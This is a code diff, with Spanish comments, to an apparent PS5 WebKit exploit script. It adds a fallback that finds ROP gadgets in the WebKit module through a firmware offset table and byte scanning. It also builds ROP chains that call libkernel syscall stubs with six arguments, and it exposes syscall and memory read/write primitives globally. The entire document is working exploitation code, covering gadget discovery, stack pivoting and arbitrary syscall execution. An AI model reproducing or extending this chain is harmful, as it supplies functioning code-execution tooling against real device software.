@@ -14,7 +14,8 @@
     const PS5 = {
         ready: false, mode: "NONE", fw: "??.??",
         webkitBase: null, libkernelBase: null,
-        gadgets: null, mallocEnd: 0, notes: [],
+        gadgets: null, stubs: null, stubMode: false,
+        mallocEnd: 0, notes: [],
     };
     global.PS5 = PS5;
 
@@ -294,6 +295,118 @@
         }
     }
 
+    // ---------- [Mods X1NON] fallback con gadgets de WebKit + stubs ----------
+    // Si el escaneo de libkernel falla (.text protegido post-init), usamos:
+    //   - gadgets VERIFICADOS de libSceNKWebKit (tabla X1NON 13.XX, validados
+    //     byte a byte: WebKit es el modulo propio del proceso y es legible),
+    //   - los STUBS C de libkernel por numero de syscall (ejecutados via ROP
+    //     SIN leer libkernel: solo se salta a base+rva).
+    // La cadena resultante soporta los 6 args del wrapper C (rdi,rsi,rdx,rcx,
+    // r8,r9; el stub mueve rcx->r10 internamente).
+    const WEBKIT_TEXT_SIZE = 0x2c7c000;
+    const WK_PATTERNS = {
+        poprdi: [0x5f, 0xc3], poprsi: [0x5e, 0xc3], poprdx: [0x5a, 0xc3],
+        poprcx: [0x59, 0xc3], poprax: [0x58, 0xc3], poprsp: [0x5c, 0xc3],
+        popr8: [0x41, 0x58, 0xc3], popr9: [0x41, 0x59, 0xc3],
+        store: [0x48, 0x89, 0x07, 0xc3], ret: [0xc3],
+    };
+    const WK_NAME = {
+        poprdi: "pop rdi", poprsi: "pop rsi", poprdx: "pop rdx",
+        poprcx: "pop rcx", poprax: "pop rax", poprsp: "pop rsp",
+        popr8: "pop r8", popr9: "pop r9",
+        store: "mov [rdi], rax", ret: "ret",
+    };
+    function pickX1non() {
+        try {
+            const T = (typeof window !== "undefined") ? window.X1NON_13X : null;
+            if (!T) { PS5.notes.push("wk-no-table"); return null; }
+            if (T[PS5.fw]) return T[PS5.fw];
+            const parts = String(PS5.fw).split(".");
+            const want = parseInt(parts[0], 10) * 100 + parseInt(parts[1] || "0", 10);
+            const maj = parts[0];
+            let best = null, bestD = 1e9;
+            for (const k in T) {
+                if (k.split(".")[0] !== maj) continue;
+                const p = k.split(".");
+                const n = parseInt(p[0], 10) * 100 + parseInt(p[1], 10);
+                const d = Math.abs(n - want);
+                if (d < bestD) { bestD = d; best = k; }
+            }
+            if (best) { PS5.notes.push("wk-nearest:" + best); return T[best]; }
+        } catch (e) { PS5.notes.push("wk-pick-threw"); }
+        PS5.notes.push("wk-no-table");
+        return null;
+    }
+    function scanWkPattern(pat) {
+        const CHUNK = 0x2000;
+        const base = (PS5.libkernelBase > 0x800000000 && PS5.libkernelBase < 0x900000000)
+            ? PS5.libkernelBase : ctx.libkernelBase; // no usado; wk usa webkit
+        for (let off = 0; off < WEBKIT_TEXT_SIZE; off += CHUNK) {
+            let mem;
+            try { mem = rdBytes(ctx.webkitBase + off, Math.min(CHUNK + 16, WEBKIT_TEXT_SIZE - off)); }
+            catch (e) { PS5.notes.push("wk-scan-fault@" + off.toString(16)); return null; }
+            const f = findPat(mem, ctx.webkitBase + off, pat);
+            if (f !== null) return f;
+        }
+        return null;
+    }
+    function tryWkFallback() {
+        const x = pickX1non();
+        if (!x) return false;
+        const kbase = (PS5.libkernelBase > 0x800000000 && PS5.libkernelBase < 0x900000000)
+            ? PS5.libkernelBase : ctx.libkernelBase;
+        if (!(kbase > 0x800000000 && kbase < 0x900000000)) {
+            PS5.notes.push("wk-no-libkernel-base");
+            return false;
+        }
+        // sonda no destructiva: 1 byte del .text de WebKit
+        try {
+            const p = ctx.aim(ctx.webkitBase);
+            if (p === null || p === undefined) { PS5.notes.push("wk-probe-null"); return false; }
+            PS5.notes.push("wk-probe-ok");
+        } catch (e) {
+            PS5.notes.push("wk-probe-threw:" + String(e.message || e).slice(0, 40));
+            return false;
+        }
+        const g = {};
+        for (const key of Object.keys(WK_PATTERNS)) {
+            const name = WK_NAME[key];
+            const rva = x.wkGadgets[name];
+            if (!rva) { PS5.notes.push("wk-missing-gadget:" + name); return false; }
+            try {
+                const v = ctx.aim(ctx.webkitBase + rva);
+                const pat = WK_PATTERNS[key];
+                for (let i = 0; i < pat.length; ++i) {
+                    if ((v[i] & 0xff) !== pat[i]) {
+                        PS5.notes.push("wk-bad-bytes:" + name);
+                        return false;
+                    }
+                }
+                g[key] = ctx.webkitBase + rva;
+            } catch (e) {
+                PS5.notes.push("wk-read-threw:" + name);
+                return false;
+            }
+        }
+        // pivot (mov rsp,rdi; ret = 48 8b e7 c3) y save (mov [rdi],rsp; ret =
+        // 48 89 27 c3) NO estan en la tabla X1NON: busqueda dirigida en el
+        // .text de WebKit (legible).
+        g.pivot = scanWkPattern([0x48, 0x8b, 0xe7, 0xc3]);
+        if (g.pivot === null) g.pivot = scanWkPattern([0x57, 0x5c, 0xc3]);
+        if (g.pivot === null) { PS5.notes.push("wk-no-pivot"); return false; }
+        g.save = scanWkPattern([0x48, 0x89, 0x27, 0xc3]);
+        if (g.save === null) { PS5.notes.push("wk-no-save-gadget"); return false; }
+        // stubs por numero de syscall: se EJECUTAN (no se leen)
+        PS5.stubs = {};
+        for (const numStr in x.syscallStubs)
+            PS5.stubs[numStr] = kbase + x.syscallStubs[numStr];
+        PS5.gadgets = g;
+        PS5.stubMode = true;
+        PS5.notes.push("wk-mode-ok:stubs=" + Object.keys(PS5.stubs).length
+            + " pivot=0x" + g.pivot.toString(16));
+        return true;
+    }
+
     // ---------- syscall modo ROP ----------
     // cadena (20 qwords en arena+0x8000): pivote a rdi=chain; pop rax=num;
     // pop rdi..r9=args; syscall(0f05c3); pop rdi=&res; store(mov [rdi],rax);
@@ -307,23 +420,46 @@
         if (!(R0 > 0x100000000 && R0 < 0x1000000000000))
             throw new Error("rsp-garbage:" + HEX(R0));
         // 2) montar cadena
-        const S = new Array(20).fill(0);
-        S[0] = g.poprax; S[1] = num;
-        const pops = [g.poprdi, g.poprsi, g.poprdx, g.popr10, g.popr8, g.popr9];
-        for (let i = 0; i < 6; ++i) {
-            S[2 + i * 2] = pops[i];
-            S[3 + i * 2] = Number(B(args[i] === undefined ? 0 : args[i]));
+        let S;
+        if (PS5.stubMode) {
+            // [Mods X1NON] cadena por STUBS: sin gadget syscall ni pop rax.
+            // Se salta al wrapper C de libkernel (base+rva) con los 6 args en
+            // rdi,rsi,rdx,rcx,r8,r9 (el wrapper mueve rcx->r10 internamente).
+            const stub = PS5.stubs && PS5.stubs[String(num)];
+            if (stub === undefined)
+                throw new Error("syscall-" + num + "-no-stub-in-table");
+            S = [
+                g.poprdi, Number(B(args[0] === undefined ? 0 : args[0])),
+                g.poprsi, Number(B(args[1] === undefined ? 0 : args[1])),
+                g.poprdx, Number(B(args[2] === undefined ? 0 : args[2])),
+                g.poprcx, Number(B(args[3] === undefined ? 0 : args[3])),
+                g.popr8, Number(B(args[4] === undefined ? 0 : args[4])),
+                g.popr9, Number(B(args[5] === undefined ? 0 : args[5])),
+                Number(B(stub)),
+                g.poprdi, ctx.arenaBacking + OFF_RES,
+                g.store,
+                g.poprsp,
+                R0,
+            ];
+        } else {
+            S = new Array(20).fill(0);
+            S[0] = g.poprax; S[1] = num;
+            const pops = [g.poprdi, g.poprsi, g.poprdx, g.popr10, g.popr8, g.popr9];
+            for (let i = 0; i < 6; ++i) {
+                S[2 + i * 2] = pops[i];
+                S[3 + i * 2] = Number(B(args[i] === undefined ? 0 : args[i]));
+            }
+            S[14] = g.syscall;
+            S[15] = g.poprdi; S[16] = ctx.arenaBacking + OFF_RES;
+            S[17] = g.store;
+            S[18] = g.poprsp;
+            // el save-gadget (mov [rdi],rsp) ejecuta ANTES de su ret: guarda el
+            // rsp de entrada (puntero a la antigua dir. de retorno de ICU). El
+            // ret de la cadena reentra ICU exactamente.
+            S[19] = R0;
         }
-        S[14] = g.syscall;
-        S[15] = g.poprdi; S[16] = ctx.arenaBacking + OFF_RES;
-        S[17] = g.store;
-        S[18] = g.poprsp;
-        // el save-gadget (mov [rdi],rsp) ejecuta ANTES de su ret: guarda el
-        // rsp de entrada (puntero a la antigua dir. de retorno de ICU). El
-        // ret de la cadena reentra ICU exactamente.
-        S[19] = R0;
-        const q = new Uint8Array(20 * 8);
-        for (let i = 0; i < 20; ++i) {
+        const q = new Uint8Array(S.length * 8);
+        for (let i = 0; i < S.length; ++i) {
             const p = pack(S[i], 8);
             for (let j = 0; j < 8; ++j) q[i * 8 + j] = p[j];
         }
@@ -418,6 +554,12 @@
         let ropOK = false;
         try { if (ropProbe()) ropOK = scanGadgets(); }
         catch (e) { PS5.notes.push("scan-threw:" + String(e.message || e).slice(0, 60)); }
+        if (!ropOK) {
+            // [Mods X1NON] la via libkernel fallo (base invalida, probe o
+            // escaneo): intentamos gadgets de WebKit + stubs por syscall.
+            try { ropOK = tryWkFallback(); }
+            catch (e) { PS5.notes.push("wk-fb-threw:" + String(e.message || e).slice(0, 60)); }
+        }
         PS5.mode = ropOK ? "ROP" : "DIRECT";
         PS5.ready = true;
 
@@ -430,6 +572,7 @@
         global.write32 = write32; global.write64 = write64;
         global.syscall = syscall;
         global.SYSCALL = SYSN;
+        global.SYSCALL_STUBS = PS5.stubs;   // [Mods X1NON] rva absolutos por num (o null)
         global.get_error_string = get_error_string;
         global.send_notification = send_notification;
         global.PS5call = nativeCall;
